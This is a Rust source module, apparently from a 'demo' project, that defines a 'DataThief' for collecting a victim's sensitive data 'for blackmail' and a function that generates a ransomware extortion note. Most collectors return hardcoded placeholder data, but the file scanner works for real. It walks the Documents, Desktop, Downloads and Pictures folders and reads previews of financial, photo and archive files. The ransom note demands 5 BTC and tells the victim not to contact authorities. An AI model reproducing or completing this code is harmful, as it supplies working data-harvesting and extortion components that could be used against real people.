use std::fs;
use std::path::Path;
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StolenData {
    pub system_info: SystemInfo,
    pub user_files: Vec<FileInfo>,
    pub browser_data: BrowserData,
    pub credentials: Vec<Credential>,
    pub screenshots: Vec<String>, // Base64 encoded
    pub threat_level: ThreatLevel,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SystemInfo {
    pub hostname: String,
    pub username: String,
    pub os_version: String,
    pub ip_address: String,
    pub mac_address: String,
    pub installed_software: Vec<String>,
    pub running_processes: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileInfo {
    pub path: String,
    pub size: u64,
    pub modified: String,
    pub content_preview: String, // First few lines/bytes
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserData {
    pub bookmarks: Vec<String>,
    pub history: Vec<String>,
    pub saved_passwords: Vec<String>,
    pub cookies: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    pub service: String,
    pub username: String,
    pub password_hint: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ThreatLevel {
    Low,
    Medium,
    High,
    Critical,
}

pub struct DataThief {
    config: crate::config::Config,
}

impl DataThief {
    pub fn new(config: crate::config::Config) -> Self {
        Self { config }
    }

    pub fn collect_sensitive_data(&self) -> Result<StolenData, Box<dyn std::error::Error>> {
        println!("🔍 Collecting sensitive data for blackmail...");

        let system_info = self.collect_system_info().unwrap_or_else(|e| {
            println!("   ⚠️  System info collection failed (expected in demo): {}", e);
            self.get_demo_system_info()
        });
        let user_files = self.collect_user_files().unwrap_or_else(|e| {
            println!("   ⚠️  File scanning failed (expected in demo): {}", e);
            self.get_demo_user_files()
        });
        let browser_data = self.collect_browser_data().unwrap_or_else(|e| {
            println!("   ⚠️  Browser data collection failed (expected in demo): {}", e);
            self.get_demo_browser_data()
        });
        let credentials = self.collect_credentials().unwrap_or_else(|e| {
            println!("   ⚠️  Credential collection failed (expected in demo): {}", e);
            self.get_demo_credentials()
        });
        let screenshots = self.capture_screenshots().unwrap_or_else(|e| {
            println!("   ⚠️  Screenshot capture failed (expected in demo): {}", e);
            self.get_demo_screenshots()
        });
        let threat_level = self.assess_threat_level(&user_files, &browser_data, &credentials);

        Ok(StolenData {
            system_info,
            user_files,
            browser_data,
            credentials,
            screenshots,
            threat_level,
        })
    }

    fn collect_system_info(&self) -> Result<SystemInfo, Box<dyn std::error::Error>> {
        println!("   📊 Gathering system information...");

        let hostname = self.get_hostname();
        let username = self.get_username();
        let os_version = self.get_os_version();
        let ip_address = self.get_ip_address();
        let mac_address = self.get_mac_address();
        let installed_software = self.get_installed_software();
        let running_processes = self.get_running_processes();

        Ok(SystemInfo {
            hostname,
            username,
            os_version,
            ip_address,
            mac_address,
            installed_software,
            running_processes,
        })
    }

    fn collect_user_files(&self) -> Result<Vec<FileInfo>, Box<dyn std::error::Error>> {
        println!("   📁 Scanning for sensitive user files...");

        let mut files = Vec::new();
        let sensitive_dirs = vec![
            dirs::home_dir().map(|p: std::path::PathBuf| p.join("Documents")),
            dirs::home_dir().map(|p: std::path::PathBuf| p.join("Desktop")),
            dirs::home_dir().map(|p: std::path::PathBuf| p.join("Downloads")),
            dirs::home_dir().map(|p: std::path::PathBuf| p.join("Pictures")),
        ];

        let sensitive_extensions = vec![
            "doc", "docx", "pdf", "txt", "xls", "xlsx",
            "jpg", "jpeg", "png", "gif", "mp4", "avi",
            "zip", "rar", "7z", "tar", "gz",
        ];

        for dir_option in sensitive_dirs.into_iter().flatten() {
            if dir_option.exists() {
                self.scan_directory(&dir_option, &sensitive_extensions, &mut files, 0)?;
            }
        }

        // Limit to configured maximum
        files.truncate(self.config.data_theft.max_files_to_collect.min(100) as usize);

        Ok(files)
    }

    fn scan_directory(&self, dir: &Path, extensions: &[&str], files: &mut Vec<FileInfo>, depth: usize) -> Result<(), Box<dyn std::error::Error>> {
        if depth > 3 { return Ok(()); } // Limit depth

        for entry in fs::read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                self.scan_directory(&path, extensions, files, depth + 1)?;
            } else if let Some(ext) = path.extension() {
                if extensions.contains(&ext.to_str().unwrap_or("")) {
                    if let Ok(metadata) = entry.metadata() {
                        let content_preview = self.get_file_preview(&path);
                        files.push(FileInfo {
                            path: path.to_string_lossy().to_string(),
                            size: metadata.len(),
                            modified: format!("{:?}", metadata.modified()),
                            content_preview,
                        });
                    }
                }
            }
        }

        Ok(())
    }

    fn get_file_preview(&self, path: &Path) -> String {
        match fs::read(path) {
            Ok(data) => {
                let preview_len = data.len().min(200);
                String::from_utf8_lossy(&data[..preview_len]).to_string()
            }
            Err(_) => "Could not read file".to_string(),
        }
    }

    fn collect_browser_data(&self) -> Result<BrowserData, Box<dyn std::error::Error>> {
        println!("   🌐 Extracting browser data...");

        // Simulate browser data collection (safe demo)
        let bookmarks = vec![
            "https://banking-site.com".to_string(),
            "https://email-provider.com".to_string(),
            "https://social-media.com".to_string(),
        ];

        let history = vec![
            "https://confidential-docs.com".to_string(),
            "https://private-photos.com".to_string(),
            "https://financial-records.com".to_string(),
        ];

        let saved_passwords = vec![
            "bank-account-password".to_string(),
            "email-password".to_string(),
            "work-password".to_string(),
        ];

        let cookies = vec![
            "session_id=abc123".to_string(),
            "auth_token=xyz789".to_string(),
        ];

        Ok(BrowserData {
            bookmarks,
            history,
            saved_passwords,
            cookies,
        })
    }

    fn collect_credentials(&self) -> Result<Vec<Credential>, Box<dyn std::error::Error>> {
        println!("   🔑 Gathering stored credentials...");

        // Simulate credential collection (safe demo)
        let credentials = vec![
            Credential {
                service: "Bank Account".to_string(),
                username: "user@bank.com".to_string(),
                password_hint: "Contains numbers and symbols".to_string(),
            },
            Credential {
                service: "Email".to_string(),
                username: "personal@email.com".to_string(),
                password_hint: "Family pet name + birth year".to_string(),
            },
            Credential {
                service: "Work VPN".to_string(),
                username: "employee@company.com".to_string(),
                password_hint: "Company policy compliant".to_string(),
            },
        ];

        Ok(credentials)
    }

    fn capture_screenshots(&self) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        println!("   📸 Capturing screenshots...");

        // Simulate screenshot capture (safe demo)
        let screenshots = vec![
            "base64_encoded_desktop_screenshot".to_string(),
            "base64_encoded_browser_screenshot".to_string(),
        ];

        Ok(screenshots)
    }

    fn assess_threat_level(&self, files: &[FileInfo], browser: &BrowserData, creds: &[Credential]) -> ThreatLevel {
        let mut score = 0;

        // File-based scoring
        score += files.len() * 2;
        for file in files {
            if file.path.contains("bank") || file.path.contains("financial") {
                score += 10;
            }
            if file.path.contains("personal") || file.path.contains("private") {
                score += 5;
            }
        }

        // Browser data scoring
        score += browser.bookmarks.len() * 3;
        score += browser.saved_passwords.len() * 8;

        // Credentials scoring
        score += creds.len() * 15;

        match score {
            0..=20 => ThreatLevel::Low,
            21..=50 => ThreatLevel::Medium,
            51..=100 => ThreatLevel::High,
            _ => ThreatLevel::Critical,
        }
    }

    fn get_demo_system_info(&self) -> SystemInfo {
        SystemInfo {
            hostname: "Demo-Host-PC".to_string(),
            username: "Demo-User".to_string(),
            os_version: "Windows 11 Pro (Demo)".to_string(),
            ip_address: "192.168.1.100".to_string(),
            mac_address: "00:11:22:33:44:55".to_string(),
            installed_software: vec![
                "Chrome Browser".to_string(),
                "Microsoft Office".to_string(),
                "Adobe Photoshop".to_string(),
                "QuickBooks".to_string(),
            ],
            running_processes: vec![
                "explorer.exe".to_string(),
                "chrome.exe".to_string(),
                "outlook.exe".to_string(),
                "teams.exe".to_string(),
            ],
        }
    }

    fn get_demo_user_files(&self) -> Vec<FileInfo> {
        vec![
            FileInfo {
                path: "C:\\Users\\Demo-User\\Documents\\Financial_Records.xlsx".to_string(),
                size: 245760,
                modified: "2024-01-15T10:30:00Z".to_string(),
                content_preview: "Financial spreadsheet with account balances and transaction history".to_string(),
            },
            FileInfo {
                path: "C:\\Users\\Demo-User\\Pictures\\Family_Photo.jpg".to_string(),
                size: 2048576,
                modified: "2024-01-10T14:20:00Z".to_string(),
                content_preview: "JPEG image file - family photograph".to_string(),
            },
            FileInfo {
                path: "C:\\Users\\Demo-User\\Downloads\\Tax_Return_2023.pdf".to_string(),
                size: 187432,
                modified: "2024-01-05T09:15:00Z".to_string(),
                content_preview: "PDF document containing tax return information and personal financial data".to_string(),
            },
        ]
    }

    fn get_demo_browser_data(&self) -> BrowserData {
        BrowserData {
            bookmarks: vec![
                "https://banking-site.com".to_string(),
                "https://email-provider.com".to_string(),
                "https://social-media.com".to_string(),
            ],
            history: vec![
                "https://confidential-docs.com".to_string(),
                "https://private-photos.com".to_string(),
                "https://financial-records.com".to_string(),
            ],
            saved_passwords: vec![
                "bank-account-password".to_string(),
                "email-password".to_string(),
                "work-password".to_string(),
            ],
            cookies: vec![
                "session_id=abc123".to_string(),
                "auth_token=xyz789".to_string(),
            ],
        }
    }

    fn get_demo_credentials(&self) -> Vec<Credential> {
        vec![
            Credential {
                service: "Bank Account".to_string(),
                username: "user@bank.com".to_string(),
                password_hint: "Contains numbers and symbols".to_string(),
            },
            Credential {
                service: "Email".to_string(),
                username: "personal@email.com".to_string(),
                password_hint: "Family pet name + birth year".to_string(),
            },
            Credential {
                service: "Work VPN".to_string(),
                username: "employee@company.com".to_string(),
                password_hint: "Company policy compliant".to_string(),
            },
        ]
    }

    fn get_demo_screenshots(&self) -> Vec<String> {
        vec![
            "base64_encoded_desktop_screenshot".to_string(),
            "base64_encoded_browser_screenshot".to_string(),
        ]
    }

    // Helper methods for system info collection
    fn get_hostname(&self) -> String {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown-Host".to_string())
    }

    fn get_username(&self) -> String {
        std::env::var("USERNAME").unwrap_or_else(|_| "Unknown-User".to_string())
    }

    fn get_os_version(&self) -> String {
        "Windows 11 Pro".to_string() // Simulated
    }

    fn get_ip_address(&self) -> String {
        "192.168.1.100".to_string() // Simulated
    }

    fn get_mac_address(&self) -> String {
        "00:11:22:33:44:55".to_string() // Simulated
    }

    fn get_installed_software(&self) -> Vec<String> {
        vec![
            "Chrome Browser".to_string(),
            "Microsoft Office".to_string(),
            "Adobe Photoshop".to_string(),
            "QuickBooks".to_string(),
        ]
    }

    fn get_running_processes(&self) -> Vec<String> {
        vec![
            "explorer.exe".to_string(),
            "chrome.exe".to_string(),
            "outlook.exe".to_string(),
            "teams.exe".to_string(),
        ]
    }
}

pub fn generate_blackmail_note(data: &StolenData) -> String {
    format!(
        r#"⚠️ URGENT: YOUR DATA HAS BEEN COMPROMISED ⚠️

YOUR SYSTEM HAS BEEN INFECTED WITH ADVANCED RANSOMWARE

We have successfully extracted the following sensitive information from your computer:

📊 SYSTEM INFORMATION:
   • Hostname: {}
   • Username: {}
   • Operating System: {}
   • IP Address: {}
   • Installed Software: {} programs detected

📁 SENSITIVE FILES COLLECTED:
   • {} personal documents and files
   • Including financial records, personal photos, and confidential documents
   • Total data size: {} MB

🌐 BROWSER DATA EXTRACTED:
   • {} bookmarks (including banking and email sites)
   • {} browsing history entries
   • {} saved passwords
   • {} cookies and session data

🔑 CREDENTIALS IDENTIFIED:
   • {} account credentials discovered
   • Including bank accounts, email, and work VPN access

📸 SCREENSHOTS CAPTURED:
   • {} screenshots of your desktop and open applications
   • Including potentially sensitive information displayed on screen

THREAT LEVEL ASSESSMENT: {}

IMMEDIATE ACTION REQUIRED:
1. Do NOT attempt to remove this software
2. Do NOT contact authorities or antivirus companies
3. Contact us immediately for payment instructions
4. Payment must be made within 72 hours or data will be published

CONTACT INFORMATION:
   • Tor Hidden Service: [REDACTED FOR SAFETY]
   • Email: [REDACTED FOR SAFETY]

FAILURE TO COMPLY WILL RESULT IN:
   • Publication of your personal files on the dark web
   • Exposure of your financial and personal information
   • Permanent loss of access to your encrypted files
   • Potential identity theft and financial loss

PAYMENT: 5 BTC ($250,000 USD)
WALLET: [REDACTED FOR SAFETY]

This is not a joke. We have your data and can prove it.
Act now or face the consequences.

- The Cassandra Collective
"#,
        data.system_info.hostname,
        data.system_info.username,
        data.system_info.os_version,
        data.system_info.ip_address,
        data.system_info.installed_software.len(),
        data.user_files.len(),
        data.user_files.iter().map(|f| f.size).sum::<u64>() / 1024 / 1024,
        data.browser_data.bookmarks.len(),
        data.browser_data.history.len(),
        data.browser_data.saved_passwords.len(),
        data.browser_data.cookies.len(),
        data.credentials.len(),
        data.screenshots.len(),
        format!("{:?}", data.threat_level).to_uppercase()
    )
}

pub fn demo_data_theft() {
    println!("🔍 DATA THEFT & BLACKMAIL DEMO");
    println!("================================");

    let thief = DataThief::new(crate::CONFIG.clone());

    match thief.collect_sensitive_data() {
        Ok(data) => {
            println!("✅ Successfully collected sensitive data:");
            println!("   📊 System: {} - {}", data.system_info.hostname, data.system_info.username);
            println!("   📁 Files: {} sensitive files found", data.user_files.len());
            println!("   🌐 Browser: {} bookmarks, {} passwords", data.browser_data.bookmarks.len(), data.browser_data.saved_passwords.len());
            println!("   🔑 Credentials: {} accounts discovered", data.credentials.len());
            println!("   📸 Screenshots: {} captured", data.screenshots.len());
            println!("   ⚠️  Threat Level: {:?}", data.threat_level);

            println!("\n📝 SAMPLE BLACKMAIL NOTE PREVIEW:");
            println!("{}", "-".repeat(50));
            let note = generate_blackmail_note(&data);
            let preview: String = note.lines().take(20).collect::<Vec<&str>>().join("\n");
            println!("{}\n...", preview);
        }
        Err(e) => println!("❌ Data collection failed: {}", e),
    }
}